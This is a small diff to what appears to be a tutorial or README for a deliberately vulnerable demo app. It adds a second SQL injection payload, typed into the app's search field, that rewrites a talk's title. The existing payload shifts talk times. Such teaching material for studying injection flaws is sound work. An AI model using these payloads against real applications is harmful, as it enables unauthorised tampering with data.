@@ -53,6 +53,7 @@ In the app, put this in the search field:
 
 ```sql
 %'; update talk set start_date = dateadd(hour,-2,CURRENT_TIMESTAMP), end_date = dateadd(hour,1,CURRENT_TIMESTAMP) where id = 1; --
+%'; update talk set title='Superman' where id = 10; --
 ```
 
 This moves _your_ talks to the top of the list by adjusting the start times.
